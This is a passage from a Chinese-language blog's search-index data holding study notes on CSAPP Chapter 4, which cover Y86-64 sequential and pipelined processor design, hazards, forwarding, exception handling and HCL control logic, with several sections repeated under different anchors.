Chapter 4 - 处理器体系结构","uri":"/ch4/#更新-pc"},{"categories":["系统入门"],"content":" 2.7 各阶段总结 2.7.1 取指输入：根据 PC 从指令存储器中取出的指令 输出： icode ifun rA rB valC valP instr_valid imem_error 2.7.2 译码 \u0026 写回输入： icode rA rB rsp（常量） 输出： valA valB 2.7.3 执行输入： icode ifun valA valC -8（常量） 8（常量） valB 0（常量） 输出： valE Cnd 2.7.4 访存输入： icode valE valA valP imem_error instr_valid dmem_error 输出： Stat 状态码 valM 2.7.5 PC 更新输入： icode Cnd valP valC valM 输出： 新的 PC 我们将以上所有阶段结构组合起来，即可构成我们的 Y86_64 顺序结构处理器。具体图像不再重复绘制。 ","date":"2024-03-13","objectID":"/ch4/:2:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#各阶段总结"},{"categories":["系统入门"],"content":" 2.7 各阶段总结 2.7.1 取指输入：根据 PC 从指令存储器中取出的指令 输出： icode ifun rA rB valC valP instr_valid imem_error 2.7.2 译码 \u0026 写回输入： icode rA rB rsp（常量） 输出： valA valB 2.7.3 执行输入： icode ifun valA valC -8（常量） 8（常量） valB 0（常量） 输出： valE Cnd 2.7.4 访存输入： icode valE valA valP imem_error instr_valid dmem_error 输出： Stat 状态码 valM 2.7.5 PC 更新输入： icode Cnd valP valC valM 输出： 新的 PC 我们将以上所有阶段结构组合起来，即可构成我们的 Y86_64 顺序结构处理器。具体图像不再重复绘制。 ","date":"2024-03-13","objectID":"/ch4/:2:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#取指"},{"categories":["系统入门"],"content":" 2.7 各阶段总结 2.7.1 取指输入：根据 PC 从指令存储器中取出的指令 输出： icode ifun rA rB valC valP instr_valid imem_error 2.7.2 译码 \u0026 写回输入： icode rA rB rsp（常量） 输出： valA valB 2.7.3 执行输入： icode ifun valA valC -8（常量） 8（常量） valB 0（常量） 输出： valE Cnd 2.7.4 访存输入： icode valE valA valP imem_error instr_valid dmem_error 输出： Stat 状态码 valM 2.7.5 PC 更新输入： icode Cnd valP valC valM 输出： 新的 PC 我们将以上所有阶段结构组合起来，即可构成我们的 Y86_64 顺序结构处理器。具体图像不再重复绘制。 ","date":"2024-03-13","objectID":"/ch4/:2:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#译码--写回"},{"categories":["系统入门"],"content":" 2.7 各阶段总结 2.7.1 取指输入：根据 PC 从指令存储器中取出的指令 输出： icode ifun rA rB valC valP instr_valid imem_error 2.7.2 译码 \u0026 写回输入： icode rA rB rsp（常量） 输出： valA valB 2.7.3 执行输入： icode ifun valA valC -8（常量） 8（常量） valB 0（常量） 输出： valE Cnd 2.7.4 访存输入： icode valE valA valP imem_error instr_valid dmem_error 输出： Stat 状态码 valM 2.7.5 PC 更新输入： icode Cnd valP valC valM 输出： 新的 PC 我们将以上所有阶段结构组合起来，即可构成我们的 Y86_64 顺序结构处理器。具体图像不再重复绘制。 ","date":"2024-03-13","objectID":"/ch4/:2:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#执行"},{"categories":["系统入门"],"content":" 2.7 各阶段总结 2.7.1 取指输入：根据 PC 从指令存储器中取出的指令 输出： icode ifun rA rB valC valP instr_valid imem_error 2.7.2 译码 \u0026 写回输入： icode rA rB rsp（常量） 输出： valA valB 2.7.3 执行输入： icode ifun valA valC -8（常量） 8（常量） valB 0（常量） 输出： valE Cnd 2.7.4 访存输入： icode valE valA valP imem_error instr_valid dmem_error 输出： Stat 状态码 valM 2.7.5 PC 更新输入： icode Cnd valP valC valM 输出： 新的 PC 我们将以上所有阶段结构组合起来，即可构成我们的 Y86_64 顺序结构处理器。具体图像不再重复绘制。 ","date":"2024-03-13","objectID":"/ch4/:2:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#访存"},{"categories":["系统入门"],"content":" 2.7 各阶段总结 2.7.1 取指输入：根据 PC 从指令存储器中取出的指令 输出： icode ifun rA rB valC valP instr_valid imem_error 2.7.2 译码 \u0026 写回输入： icode rA rB rsp（常量） 输出： valA valB 2.7.3 执行输入： icode ifun valA valC -8（常量） 8（常量） valB 0（常量） 输出： valE Cnd 2.7.4 访存输入： icode valE valA valP imem_error instr_valid dmem_error 输出： Stat 状态码 valM 2.7.5 PC 更新输入： icode Cnd valP valC valM 输出： 新的 PC 我们将以上所有阶段结构组合起来，即可构成我们的 Y86_64 顺序结构处理器。具体图像不再重复绘制。 ","date":"2024-03-13","objectID":"/ch4/:2:7","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#pc-更新"},{"categories":["系统入门"],"content":" 3 流水线原理简介流水线将一个处理过程分解为多个阶段，可能有多个指令处于不同的处理阶段之中。流水线化的一个重要特性就是吞吐量，也就是单位时间内服务的顾客总数，不过它也会轻微的增加延迟，也就是服务一个用户所需要的时间。从头到尾执行一条指令所需要的时间称为延迟。 流水线化处理器将多个不同的阶段用寄存器分割，每个阶段用一个时钟周期的时间。每个阶段都是寄存器+组合逻辑，在时钟上升沿将该阶段组合逻辑计算出的值打入下一阶段寄存器。因此，运行时钟速率由最慢的那个阶段所决定。此外，如果流水线过深，效率可能反而会下降。 流水线的运行过程可能存在两种相关：数据相关和控制相关。数据相关多出现于下一条指令需要读入前一条指令写入的值。控制相关多出现于分支跳转，需要进行分支预测。 ","date":"2024-03-13","objectID":"/ch4/:3:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#流水线原理简介"},{"categories":["系统入门"],"content":" 4 流水线结构处理器 PIPE-实现将前述 SEQ 顺序结构处理器的信号和值传递绘制成图可得到如下结构（省略所有常量，将所有阶段抽象化，省去写回逻辑和一些其他复杂逻辑，仅仅展示所用到的寄存器值）： 流水线结构处理器 PIPE-相对于顺序结构处理器 SEQ+的变化在于： 将 PC 的计算移动到取指阶段 创建状态处理器来保存在一条指令执行过程中计算出来的信号 在各个阶段之间插入流水线寄存器 F 保存程序计数器预测值 D 保存最新取出的指令信息，交给译码阶段进行处理 E 保存译码指令和从寄存器文件读出的值 M 保存指令执行结果，和用于条件转移的分支条件和分支目标信息 W 保存要向寄存器写入的值，还要向 PC 提供返回地址 在 PIPE-中，我们在译码阶段将 valP 和 valA 利用Select A模块合并成一个数据valA，以减少寄存器中字段的个数。 ","date":"2024-03-13","objectID":"/ch4/:4:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#流水线结构处理器-pipe-实现"},{"categories":["系统入门"],"content":" 5 包含冒险控制的流水线结构处理器 PIPE 实现","date":"2024-03-13","objectID":"/ch4/:5:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#包含冒险控制的流水线结构处理器-pipe-实现"},{"categories":["系统入门"],"content":" 5.1 控制冒险控制冒险主要来源于 PC 的值不确定，需要对 PC 的值进行预测。在 Y86_64 架构中，PC 的值有以下几种可能： valP: 正常的下一条指令。主要来源于rrmovq,irmovq,OPq,rmmovq,mrmovq,pushq,popq valC: 跳转指令规定的特定指令地址。主要来源于call valM: ret时的返回地址。主要来源于ret 此外，jxx指令的结果是valC还是valP需要视察Cnd而定。 因此： 对于一般的指令，结合icode指令代码，PC 的值在取值阶段就可以确定。对于call指令是valC，对其他则是valP 对于ret指令，PC 的值需要在访存阶段结束才能确定，其值为valM(存储在W_valM中) 对于jxx，需要在执行阶段产生Cnd信号后才能决定是否跳转，若跳转，其值为valC；否则为valP(存储在M_valA中) 因此在设计中，我们采用的办法是，在取值阶段使用Predict PC模块来计算需要的是valC还是valP，将其结果存储到F取指寄存器中。在取指阶段开始之前，从Predict PC的结果，valM和valE中选择一个作为下一条指令的地址。 ","date":"2024-03-13","objectID":"/ch4/:5:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#控制冒险"},{"categories":["系统入门"],"content":" 5.2 数据冒险Y86_64 指令集架构数据冒险的产生源于主要源于要读的值还没有完成更新。 冒险的来源可能是程序寄存器、程序计数器、内存、条件码寄存器和状态寄存器，我们来逐条分析他们产生冒险的可能性： 程序寄存器：不同阶段的寄存器读写可能导致数据冒险 程序计数器(PC)：可能导致控制冒险 内存(Memory)：程序和数据分开读取，不允许自我修改代码，就不会发生冒险 条件码寄存器(CC)：不会发生冒险 状态寄存器(Stat)：让流水线中的每条指令都有一个相关联的状态码存储在寄存器中，就不会发生冒险 综上，数据冒险仅仅来源于程序寄存器的读写。控制冒险主要来源于 PC 的正确预测问题。 数据冒险的解决方法有： 用暂停避免数据冒险 用转发避免数据冒险 加载/使用数据冒险 5.2.1 用暂停避免数据冒险暂停技术是指暂停流水线中的一条或多条指令，直到冒险条件不再满足。暂停时需要暂停一条或多条指令，将一条指令暂停在译码阶段也就意味着它的下一条指令必须暂停在取指阶段，暂停方法为让 PC 保持不变，一直重复取指，直到暂停结束，而其他阶段的暂停实现方法就是在执行阶段插入一个气泡。 暂停方法的劣势在于让流水线暂停多个周期，严重降低了整体的吞吐量。 5.2.2 用转发避免数据冒险执行阶段 ALU 计算出的数据，数据需要经过如下几个步骤才能到达写回寄存器： 执行阶段输出（还未进入访存阶段寄存器） 执行阶段结果，进入访存阶段寄存器但无需访存(valE) 在访存阶段的访存结果(valM) 执行阶段结果，写回阶段寄存器中但还未写回(W_valE) 访存结果，写回阶段寄存器中但还未写回(W_valM) 转发的核心在于将要读的值直接转发到执行阶段寄存器 E(在下一个时钟周期到来时才打入，所以根本来说是转发到译码阶段) 作为源操作数，其来源可能是： 执行阶段的结果 -\u003e 译码阶段(e_valE) 进入访存阶段但是无需访存的值 -\u003e 译码阶段(M_valE) 进入写回阶段但是还没写回的值 -\u003e 译码阶段(W_valE) 访存阶段读出的值 -\u003e 译码阶段(m_valM) 访存读出的值已进入写回阶段但是还没写回 -\u003e 译码阶段(W_valM) 转发目的有两个，分别是valA和valB。 要实现转发逻辑，我们建立Sel+Fwd A和Fwd B两个块。Sel+Fwd A是Select A和转发逻辑的集合，我们前面学过Select A是从valP和valA中选择一个，Fwd A实现valA端口的转发逻辑，Fwd B实现valB端口的转发逻辑。 5.2.3 加载/使用数据冒险该数据冒险的主要原因是读内存发生的太晚，譬如上一条指令需要从内存中读取%rax，下一条指令需要使用%rax，但是读内存在译码阶段后。对这种问题的解决方案是将暂停和转发结合起来，也就是在下一条指令前加上一个气泡。这种方式称为加载互锁，加载互锁和转发技术结合起来可以处理所有可能类型的数据冒险。代价是可能会降低流水线的吞吐量。 ","date":"2024-03-13","objectID":"/ch4/:5:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#数据冒险"},{"categories":["系统入门"],"content":" 5.2 数据冒险Y86_64 指令集架构数据冒险的产生源于主要源于要读的值还没有完成更新。 冒险的来源可能是程序寄存器、程序计数器、内存、条件码寄存器和状态寄存器，我们来逐条分析他们产生冒险的可能性： 程序寄存器：不同阶段的寄存器读写可能导致数据冒险 程序计数器(PC)：可能导致控制冒险 内存(Memory)：程序和数据分开读取，不允许自我修改代码，就不会发生冒险 条件码寄存器(CC)：不会发生冒险 状态寄存器(Stat)：让流水线中的每条指令都有一个相关联的状态码存储在寄存器中，就不会发生冒险 综上，数据冒险仅仅来源于程序寄存器的读写。控制冒险主要来源于 PC 的正确预测问题。 数据冒险的解决方法有： 用暂停避免数据冒险 用转发避免数据冒险 加载/使用数据冒险 5.2.1 用暂停避免数据冒险暂停技术是指暂停流水线中的一条或多条指令，直到冒险条件不再满足。暂停时需要暂停一条或多条指令，将一条指令暂停在译码阶段也就意味着它的下一条指令必须暂停在取指阶段，暂停方法为让 PC 保持不变，一直重复取指，直到暂停结束，而其他阶段的暂停实现方法就是在执行阶段插入一个气泡。 暂停方法的劣势在于让流水线暂停多个周期，严重降低了整体的吞吐量。 5.2.2 用转发避免数据冒险执行阶段 ALU 计算出的数据，数据需要经过如下几个步骤才能到达写回寄存器： 执行阶段输出（还未进入访存阶段寄存器） 执行阶段结果，进入访存阶段寄存器但无需访存(valE) 在访存阶段的访存结果(valM) 执行阶段结果，写回阶段寄存器中但还未写回(W_valE) 访存结果，写回阶段寄存器中但还未写回(W_valM) 转发的核心在于将要读的值直接转发到执行阶段寄存器 E(在下一个时钟周期到来时才打入，所以根本来说是转发到译码阶段) 作为源操作数，其来源可能是： 执行阶段的结果 -\u003e 译码阶段(e_valE) 进入访存阶段但是无需访存的值 -\u003e 译码阶段(M_valE) 进入写回阶段但是还没写回的值 -\u003e 译码阶段(W_valE) 访存阶段读出的值 -\u003e 译码阶段(m_valM) 访存读出的值已进入写回阶段但是还没写回 -\u003e 译码阶段(W_valM) 转发目的有两个，分别是valA和valB。 要实现转发逻辑，我们建立Sel+Fwd A和Fwd B两个块。Sel+Fwd A是Select A和转发逻辑的集合，我们前面学过Select A是从valP和valA中选择一个，Fwd A实现valA端口的转发逻辑，Fwd B实现valB端口的转发逻辑。 5.2.3 加载/使用数据冒险该数据冒险的主要原因是读内存发生的太晚，譬如上一条指令需要从内存中读取%rax，下一条指令需要使用%rax，但是读内存在译码阶段后。对这种问题的解决方案是将暂停和转发结合起来，也就是在下一条指令前加上一个气泡。这种方式称为加载互锁，加载互锁和转发技术结合起来可以处理所有可能类型的数据冒险。代价是可能会降低流水线的吞吐量。 ","date":"2024-03-13","objectID":"/ch4/:5:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#用暂停避免数据冒险"},{"categories":["系统入门"],"content":" 5.2 数据冒险Y86_64 指令集架构数据冒险的产生源于主要源于要读的值还没有完成更新。 冒险的来源可能是程序寄存器、程序计数器、内存、条件码寄存器和状态寄存器，我们来逐条分析他们产生冒险的可能性： 程序寄存器：不同阶段的寄存器读写可能导致数据冒险 程序计数器(PC)：可能导致控制冒险 内存(Memory)：程序和数据分开读取，不允许自我修改代码，就不会发生冒险 条件码寄存器(CC)：不会发生冒险 状态寄存器(Stat)：让流水线中的每条指令都有一个相关联的状态码存储在寄存器中，就不会发生冒险 综上，数据冒险仅仅来源于程序寄存器的读写。控制冒险主要来源于 PC 的正确预测问题。 数据冒险的解决方法有： 用暂停避免数据冒险 用转发避免数据冒险 加载/使用数据冒险 5.2.1 用暂停避免数据冒险暂停技术是指暂停流水线中的一条或多条指令，直到冒险条件不再满足。暂停时需要暂停一条或多条指令，将一条指令暂停在译码阶段也就意味着它的下一条指令必须暂停在取指阶段，暂停方法为让 PC 保持不变，一直重复取指，直到暂停结束，而其他阶段的暂停实现方法就是在执行阶段插入一个气泡。 暂停方法的劣势在于让流水线暂停多个周期，严重降低了整体的吞吐量。 5.2.2 用转发避免数据冒险执行阶段 ALU 计算出的数据，数据需要经过如下几个步骤才能到达写回寄存器： 执行阶段输出（还未进入访存阶段寄存器） 执行阶段结果，进入访存阶段寄存器但无需访存(valE) 在访存阶段的访存结果(valM) 执行阶段结果，写回阶段寄存器中但还未写回(W_valE) 访存结果，写回阶段寄存器中但还未写回(W_valM) 转发的核心在于将要读的值直接转发到执行阶段寄存器 E(在下一个时钟周期到来时才打入，所以根本来说是转发到译码阶段) 作为源操作数，其来源可能是： 执行阶段的结果 -\u003e 译码阶段(e_valE) 进入访存阶段但是无需访存的值 -\u003e 译码阶段(M_valE) 进入写回阶段但是还没写回的值 -\u003e 译码阶段(W_valE) 访存阶段读出的值 -\u003e 译码阶段(m_valM) 访存读出的值已进入写回阶段但是还没写回 -\u003e 译码阶段(W_valM) 转发目的有两个，分别是valA和valB。 要实现转发逻辑，我们建立Sel+Fwd A和Fwd B两个块。Sel+Fwd A是Select A和转发逻辑的集合，我们前面学过Select A是从valP和valA中选择一个，Fwd A实现valA端口的转发逻辑，Fwd B实现valB端口的转发逻辑。 5.2.3 加载/使用数据冒险该数据冒险的主要原因是读内存发生的太晚，譬如上一条指令需要从内存中读取%rax，下一条指令需要使用%rax，但是读内存在译码阶段后。对这种问题的解决方案是将暂停和转发结合起来，也就是在下一条指令前加上一个气泡。这种方式称为加载互锁，加载互锁和转发技术结合起来可以处理所有可能类型的数据冒险。代价是可能会降低流水线的吞吐量。 ","date":"2024-03-13","objectID":"/ch4/:5:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#用转发避免数据冒险"},{"categories":["系统入门"],"content":" 5.2 数据冒险Y86_64 指令集架构数据冒险的产生源于主要源于要读的值还没有完成更新。 冒险的来源可能是程序寄存器、程序计数器、内存、条件码寄存器和状态寄存器，我们来逐条分析他们产生冒险的可能性： 程序寄存器：不同阶段的寄存器读写可能导致数据冒险 程序计数器(PC)：可能导致控制冒险 内存(Memory)：程序和数据分开读取，不允许自我修改代码，就不会发生冒险 条件码寄存器(CC)：不会发生冒险 状态寄存器(Stat)：让流水线中的每条指令都有一个相关联的状态码存储在寄存器中，就不会发生冒险 综上，数据冒险仅仅来源于程序寄存器的读写。控制冒险主要来源于 PC 的正确预测问题。 数据冒险的解决方法有： 用暂停避免数据冒险 用转发避免数据冒险 加载/使用数据冒险 5.2.1 用暂停避免数据冒险暂停技术是指暂停流水线中的一条或多条指令，直到冒险条件不再满足。暂停时需要暂停一条或多条指令，将一条指令暂停在译码阶段也就意味着它的下一条指令必须暂停在取指阶段，暂停方法为让 PC 保持不变，一直重复取指，直到暂停结束，而其他阶段的暂停实现方法就是在执行阶段插入一个气泡。 暂停方法的劣势在于让流水线暂停多个周期，严重降低了整体的吞吐量。 5.2.2 用转发避免数据冒险执行阶段 ALU 计算出的数据，数据需要经过如下几个步骤才能到达写回寄存器： 执行阶段输出（还未进入访存阶段寄存器） 执行阶段结果，进入访存阶段寄存器但无需访存(valE) 在访存阶段的访存结果(valM) 执行阶段结果，写回阶段寄存器中但还未写回(W_valE) 访存结果，写回阶段寄存器中但还未写回(W_valM) 转发的核心在于将要读的值直接转发到执行阶段寄存器 E(在下一个时钟周期到来时才打入，所以根本来说是转发到译码阶段) 作为源操作数，其来源可能是： 执行阶段的结果 -\u003e 译码阶段(e_valE) 进入访存阶段但是无需访存的值 -\u003e 译码阶段(M_valE) 进入写回阶段但是还没写回的值 -\u003e 译码阶段(W_valE) 访存阶段读出的值 -\u003e 译码阶段(m_valM) 访存读出的值已进入写回阶段但是还没写回 -\u003e 译码阶段(W_valM) 转发目的有两个，分别是valA和valB。 要实现转发逻辑，我们建立Sel+Fwd A和Fwd B两个块。Sel+Fwd A是Select A和转发逻辑的集合，我们前面学过Select A是从valP和valA中选择一个，Fwd A实现valA端口的转发逻辑，Fwd B实现valB端口的转发逻辑。 5.2.3 加载/使用数据冒险该数据冒险的主要原因是读内存发生的太晚，譬如上一条指令需要从内存中读取%rax，下一条指令需要使用%rax，但是读内存在译码阶段后。对这种问题的解决方案是将暂停和转发结合起来，也就是在下一条指令前加上一个气泡。这种方式称为加载互锁，加载互锁和转发技术结合起来可以处理所有可能类型的数据冒险。代价是可能会降低流水线的吞吐量。 ","date":"2024-03-13","objectID":"/ch4/:5:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#加载使用数据冒险"},{"categories":["系统入门"],"content":" 5.3 避免控制冒险控制冒险主要发生在ret指令和跳转指令。 ret指令中，因为指令的地址需要在读内存后写回阶段写入pc，但是如果一个call指令紧接着一条ret指令的话，还不等到地址写入就会取指了，因此需要通过 3 个nop指令来让他暂停。 对于跳转指令，我们也是通过 2 个气泡同时取出跳转指令后的指令来取消预测错误的指令，但是会浪费几个时钟周期。 对基本是中的简单扩展就可以让我们暂停流水段，并向作为流水线控制逻辑的一部分呢流水线寄存器中插入气泡。 ","date":"2024-03-13","objectID":"/ch4/:5:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#避免控制冒险"},{"categories":["系统入门"],"content":" 6 异常处理我们的指令集架构包含 3 种不同的异常： halt指令 有非法指令和功能码组合的指令 取指或数据读写试图访问一个非法地址 处理异常的基本原则是：由流水线中最深的指令引起的异常，优先级最高。 可能会出现两种特殊情况： 导致异常的指令在后续被取消 后续的指令更改了异常状态 我们的处理器面对异常的解决办法是在每个流水线寄存器中包括一个状态码 stat，如果某个阶段产生了一个异常，这个状态字段就被设置成指示异常的种类。异常状态和该指令的其他信息一起沿着流水线传播，直到它到达写回状态。再次，流水线控制逻辑发现出现了异常，并停止执行。 为了防止后续指令修改异常状态，当处于访存或写回阶段中的指令导致异常时，流水线控制逻辑必须禁止更新条件码寄存器或数据内存。 ","date":"2024-03-13","objectID":"/ch4/:6:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#异常处理"},{"categories":["系统入门"],"content":" 7 PIPE 各阶段实现这里的信号相比 SEQ 阶段，进行了一些改动。例如译码寄存器 D 中读出的值为D_valA，而译码阶段产生的寄存器值为d_valA。详细设计不再赘述，具体如图。 ","date":"2024-03-13","objectID":"/ch4/:7:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#pipe-各阶段实现"},{"categories":["系统入门"],"content":" 7.1 取指阶段取指阶段的工作是选择程序计数器的当前值，并且选择下一个 PC 值。PC 的下一条指令的地址有如下来源： 条件跳转指令jxx dest(dest在valC中)，PC 的值为valC，要不要跳转需要等到执行阶段结束，Cnd信号产生后才能决定。如果Cnd为真，选择valC；否则选择valP。 ret指令中需要从栈中返回一个地址(valM)，要在访存阶段结束才能决定 call dest中调用的地址在valC中 其他情况下，下一条地址为valP 我们使用Predict PC来快速计算出 PC 的值，这里的下一条指令地址是可以立即预测出来的，也就是： call dest，下一条指令地址为valC jxx dest默认跳转，也就是下一条指令地址为valC 其他情况，下一条指令地址为valP 总之，要么是valC，要么是valP，这需要根据icode来决定。这里我们默认跳转，也就是jxx dest的下一条指令是valC给定的地址，如果执行阶段给出的是不跳转，我们在Select单元中会对信号进行选择，对其进行矫正。 该阶段的hcl代码如下： hcl word f_predPC = [ f_icode in {IJXX, ICALL}: f_valC; 1: f_valP; ] 不能立即预测出来的情况包括： jxx dest：需要等到执行阶段才确定 ret：需要等到访存阶段才确定 此外，下一个 PC 的来源要么是访存阶段的valM(ret指令)，要么是执行阶段的valA(也就是valP,因为后面译码阶段对valA和valP进行了合并，jxx dest指令)。我们的设计是，在取指阶段使用一个Select PC控制单元，该控制单元接受写回阶段发来的W_valM和访存阶段发来的M_valA，对其进行选择。 那么Select PC控制逻辑有 3 个 PC 来源： f_predPC：取指阶段的 PC 计算结果 W_valM：访存阶段的 PC 计算结果（适用于jxx指令，由执行阶段的Cnd选择并写入访存阶段寄存器），在这一步对jxx指令跳转的下一条指令地址进行了校准 M_valA：写回阶段的 PC 计算结果，适用于ret指令，该结果由访存阶段计算得到 因此，Select PC控制逻辑的hcl代码为： hcl word f_pc = [ # Mispredicted branch. Fetch at incremented PC M_icode == IJXX \u0026\u0026 !M_Cnd: M_valA; # RET instruction returned W_icode == IRET: W_valM; # Default: Use predicted value of PC 1: F_predPC; ] 此外，我们还是需要计算出三个信号值： Instr Valid Need Regids Need ValC 并且需要判断一下状态码： imem_error是否产生 instr_valid 是否有halt指令 其中，数据内存地址的有效性需要推迟到访存阶段才能检验。 ","date":"2024-03-13","objectID":"/ch4/:7:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#取指阶段-1"},{"categories":["系统入门"],"content":" 7.2 译码及写回阶段译码及写回阶段的重点在于Sel+Fwd A单元和Fwd B单元。 Sel+Fwd A单元实现了： valA和valP合并到valA：合并的原因是只有call dest和jxx dest需要用到valP，其他指令都是用valA，因此valA和valP不会同时使用，因此可以通过Select A进行合并，使用icode来进行控制。当icode == ICALL或ICODE == JXX，才选择valP。 选择valA的值来源 转发来的 从rA中读取 我们在前文确定了转发的来源： 执行阶段的结果 -\u003e 译码阶段(e_valE) 进入访存阶段但是无需访存的值 -\u003e 译码阶段(M_valE) 进入写回阶段但是还没写回的值 -\u003e 译码阶段(W_valE) 访存阶段读出的值 -\u003e 译码阶段(m_valM) 访存读出的值已进入写回阶段但是还没写回 -\u003e 译码阶段(W_valM) 我们需要对转发逻辑输入这些值以及其目的寄存器。因此一共 10 根线。我们需要比对转发源和输入寄存器的值（毕竟转发是因为该值还没有写入寄存器，但是时间上来不及了，因此不能让他读寄存器中的错误值，如果发现转发源和读寄存器的寄存器 ID 相同，就赶紧选择转发源，不要选src寄存器）。 信号合并+转发逻辑单元的hcl代码如下： hcl word d_valA = [ # 数据合并 D_icode in {ICALL, IJXX}: D_valP; # 转发实现 d_srcA == e_dstE: e_valE; # valE from execute d_srcA == M_dstM: m_valM; # valM from memory d_srcA == M_dstE: M_valE; # valE from memory d_srcA == M_dstM: W_valM; # valM from write back d_srcA == W_dstE: W_valE; # valE from write back # 其他情况下选择src寄存器 1: d_rvalA; ] 5 个转发源的优先级非常重要，因为转发源优先选择最近计算出的值（也就是执行阶段），流水线越浅处转发的值优先级越高。 Fwd B单元实现了valB的值来源的选择。 写回阶段的状态Stat中需要考虑写回阶段有气泡的，这是正常操作的一部分，其他情况保持Stat的值不变，hcl描述如下： hcl word Stat = [ W_stat == SBUB: SAOK; 1: W_stat; ]; ","date":"2024-03-13","objectID":"/ch4/:7:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#译码及写回阶段"},{"categories":["系统入门"],"content":" 7.3 执行阶段 ","date":"2024-03-13","objectID":"/ch4/:7:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#执行阶段-1"},{"categories":["系统入门"],"content":" 7.4 访存阶段 ","date":"2024-03-13","objectID":"/ch4/:7:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#访存阶段-1"},{"categories":["系统入门"],"content":" 8 流水线控制逻辑","date":"2024-03-13","objectID":"/ch4/:8:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#流水线控制逻辑"},{"categories":["系统入门"],"content":" 8.1 几种特殊情况及其处理几种需要处理的特殊情况包括： 加载/使用冒险： 该冒险出现的情况是在下一条指令的译码阶段，上一条指令还没有完成访存 该冒险的处理方式是在访存指令后插入一个 bubble（暂停一个周期），然后再运行下一条指令 处理 ret 该冒险出现的情况是ret指令 PC 的下一条地址是在访存阶段完成，但是后面那条指令还不等到访存写入正确的 PC 就取指了，所以需要在ret后加 3 个 bubble（暂停 3 个周期） 预测错误的分支 该情况出现的原因是获取了错误的指令，那么我们需要在获取正确的指令前插入 bubble，并且将错误的指令改成nop（取消指令） 异常 异常的情况包括遇到了halt停机，取出了错误的指令，后续指令改变了之前的异常状态，我们需要做的是让指令的状态携带在寄存器中，随着指令的运行流过流水线，并且在遇到异常后停机（禁止后面的指令更新程序员可见的状态，并且在异常指令到达写回阶段的时候停止执行） 那么问题来了: 如何发现异常？ 如何插入 bubble？ 如何暂停流水线？暂停有什么用？和插入 bubble 有什么区别？ 如何将指令改为nop？将指令改为nop有什么用？ 如何停机？ 如何处理其他异常？ 8.1.1 加载/使用冒险处理加载/使用冒险发生的时候，情况如下： 该条指令在执行阶段 下一条指令在译码阶段，并且需要读这条指令访存的值 我们的目标是： 该条指令进入访存阶段 下一条指令依然在译码阶段 将值从访存阶段转发到下一条指令的译码阶段 问题是： 如何让该条指令进入访存阶段？ 中间的执行阶段咋办？ 如何让下一条指令保持在译码阶段？ 如何让下一条指令也保持在取指阶段？ 我们的解决办法是： 该条指令照常进行工作，在下一个周期进入访存阶段 在下个周期，在下一条指令和这条指令之间插入一个气泡，填充过执行阶段 让下一条指令暂停在译码阶段（流水线寄存器 D 保持固定） 下下一条指令暂停在取指阶段（流水线寄存器 F 保持固定） 8.1.2 ret指令处理ret指令出现的时候，情况如下： ret指令正在译码阶段 下一条指令正在取指阶段 我们的目标是：等到ret指令进入写回阶段后，下一条指令在进入取指阶段 问题在于：ret指令从译码阶段到写回阶段需要 3 个时钟周期，在这期间如何保持下一条指令一直在取指阶段，且我们无法在取指阶段插入气泡 我们的解决办法是： ret指令正常执行 取指阶段暂停，一直重复取出下一条指令 在ret执行到译码、执行、访存阶段时，将那些指令替换为气泡（nop） 3 个周期结束后继续取下一条指令 8.1.3 预测错误的分支处理分支预测错误时，情况如下： jxx dest指令位于译码阶段 下一条指令位于取指阶段 我们的目标是： 等到jxx dest进入访存阶段后，取下一条指令 其他时候取出的指令作废（包括译码阶段取指、执行阶段取指） 实现的方法是： jxx dest指令正常运作 jxx dest在译码阶段、执行阶段中，处理器取出的指令替换为nop（执行阶段后才替换，因为jxx dest在执行阶段后才检测出错误来） 进入访存阶段后正常取出下一条指令 8.1.4 异常处理对于异常，我们首先采取一个措施：在寄存器中加入stat状态字段，该字段随着指令流过寄存器。我们的目标是：异常前的指令正确执行，异常后的指令对程序可见的状态没有影响。 有 2 处位置会产生异常： 取指，如果指令不合法或者指令地址不合法，会产生异常 访存，如果数据地址不合法，会产生异常 程序状态在 3 个阶段被更新： 执行 访存 写回 我们应对这 3 个阶段的异常采取的措施是： 禁止执行阶段中的指令设置条件码 像访存阶段中插入气泡 暂停写回阶段 ","date":"2024-03-13","objectID":"/ch4/:8:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#几种特殊情况及其处理"},{"categories":["系统入门"],"content":" 8.1 几种特殊情况及其处理几种需要处理的特殊情况包括： 加载/使用冒险： 